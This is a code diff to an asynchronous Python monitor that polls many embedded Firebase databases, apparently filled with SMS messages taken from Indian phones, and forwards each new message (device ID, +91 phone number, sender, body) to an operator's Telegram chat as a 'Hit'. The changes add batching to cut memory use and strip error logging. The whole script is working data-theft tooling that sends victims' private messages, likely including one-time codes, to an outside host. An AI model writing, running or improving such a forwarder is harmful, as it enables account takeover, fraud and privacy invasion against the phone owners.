@@ -1,6 +1,7 @@
-#!/usr/init/env python3
+#!/usr/bin/env python3
 """
-Async Ultra-Fast Firebase Monitor & Telegram Forwarder (Error Handled)
+Async Memory-Optimized Firebase Monitor & Telegram Forwarder
+- Uses Chunking (50 panels at a time) to prevent RAM Out of Memory crashes on Railway.
 """
 
 import asyncio
@@ -473,9 +474,7 @@ async def fetch_panel(session, panel_url, seen_ids):
                     "timestamp": ts
                 })
         return results
-    except Exception as e:
-        # Print error to logs if any panel fails
-        # print(f"Panel error {panel_url}: {e}")
+    except Exception:
         return []
 
 async def send_telegram(session, text):
@@ -483,48 +482,54 @@ async def send_telegram(session, text):
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         async with session.post(url, json={"chat_id": TARGET_CHAT_ID, "text": text}, timeout=10) as resp:
             return resp.status == 200
-    except Exception as e:
-        print(f"Telegram error: {e}")
+    except Exception:
         return False
 
 async def main():
-    try:
-        valid_urls = [parse_firebase_link(u) for u in EMBEDDED_PANELS if parse_firebase_link(u)]
-        print(f"🚀 Async Monitor started with {len(valid_urls)} panels.")
+    valid_urls = [parse_firebase_link(u) for u in EMBEDDED_PANELS if parse_firebase_link(u)]
+    print(f"🚀 Memory-Optimized Async Monitor started with {len(valid_urls)} panels.")
+    
+    seen_ids = set()
+    connector = aiohttp.TCPConnector(limit=30, ssl=False)
+    async with aiohttp.ClientSession(connector=connector, headers={"User-Agent": "Mozilla/5.0"}) as session:
+        await send_telegram(session, "✅ Memory-Optimized Monitor STARTED (26/09/2026).")
         
-        seen_ids = set()
-        connector = aiohttp.TCPConnector(limit=50, ssl=False) # Safe limit for free tiers
-        async with aiohttp.ClientSession(connector=connector, headers={"User-Agent": "Mozilla/5.0"}) as session:
-            await send_telegram(session, "✅ Async World Pharmacist Day Monitor STARTED (26/09/2026).")
+        while True:
+            # Chunking: Process 50 panels at a time to prevent RAM Out of Memory crashes
+            chunk_size = 50
+            all_messages = []
             
-            while True:
-                tasks = [fetch_panel(session, url, seen_ids) for url in valid_urls]
+            for i in range(0, len(valid_urls), chunk_size):
+                chunk = valid_urls[i:i + chunk_size]
+                tasks = [fetch_panel(session, url, seen_ids) for url in chunk]
                 responses = await asyncio.gather(*tasks, return_exceptions=True)
                 
                 for res_list in responses:
                     if isinstance(res_list, list):
-                        for msg in res_list:
-                            if msg["msg_id"] in seen_ids: continue
-                            seen_ids.add(msg["msg_id"])
-                            
-                            dt = datetime.fromtimestamp(msg["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")
-                            print(f"[{dt}] [{msg['device_id']}] {msg['phone']}: {msg['body']}")
-                            
-                            text = (
-                                f"🎯 World Pharmacist Day Hit (26/09/2026)!\n\n"
-                                f"🔗 DB Link: {msg['panel_url']}\n"
-                                f"💻 Device ID: {msg['device_id']}\n"
-                                f"📱 Phone: +91{msg['phone']}\n"
-                                f"👤 Sender: {msg['sender']}\n"
-                                f"🕒 Time: {dt}\n\n"
-                                f"💬 Message:\n{msg['body']}"
-                            )
-                            await send_telegram(session, text)
+                        all_messages.extend(res_list)
                 
-                await asyncio.sleep(1)
-    except Exception as e:
-        print(f"CRITICAL MAIN ERROR: {e}")
-        raise e
+                # Small breath gap between chunks to keep RAM and CPU completely free
+                await asyncio.sleep(0.1)
+
+            for msg in all_messages:
+                if msg["msg_id"] in seen_ids: continue
+                seen_ids.add(msg["msg_id"])
+                
+                dt = datetime.fromtimestamp(msg["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")
+                print(f"[{dt}] [{msg['device_id']}] {msg['phone']}: {msg['body']}")
+                
+                text = (
+                    f"🎯 World Pharmacist Day Hit (26/09/2026)!\n\n"
+                    f"🔗 DB Link: {msg['panel_url']}\n"
+                    f"💻 Device ID: {msg['device_id']}\n"
+                    f"📱 Phone: +91{msg['phone']}\n"
+                    f"👤 Sender: {msg['sender']}\n"
+                    f"🕒 Time: {dt}\n\n"
+                    f"💬 Message:\n{msg['body']}"
+                )
+                await send_telegram(session, text)
+            
+            await asyncio.sleep(1)
 
 if __name__ == "__main__":
     asyncio.run(main())
